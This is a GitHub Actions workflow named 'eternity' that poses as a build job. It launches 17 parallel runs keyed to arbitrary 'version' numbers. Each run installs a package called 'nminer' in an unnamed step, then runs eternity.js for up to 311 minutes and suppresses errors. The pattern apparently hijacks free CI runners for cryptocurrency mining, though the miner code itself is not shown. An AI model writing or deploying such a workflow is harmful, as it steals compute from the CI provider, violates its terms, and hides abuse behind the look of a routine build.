name: eternity
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 3369 }
          - { version: 5884 }
          - { version: 5748 }
          - { version: 1325 }
          - { version: 5606 }
          - { version: 2196 }
          - { version: 2362 }
          - { version: 690 }
          - { version: 636 }
          - { version: 6735 }
          - { version: 446 }
          - { version: 6670 }
          - { version: 2316 }
          - { version: 7700 }
          - { version: 1636 }
          - { version: 6947 }
          - { version: 2711 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 311m node eternity.js || echo "eternity executed"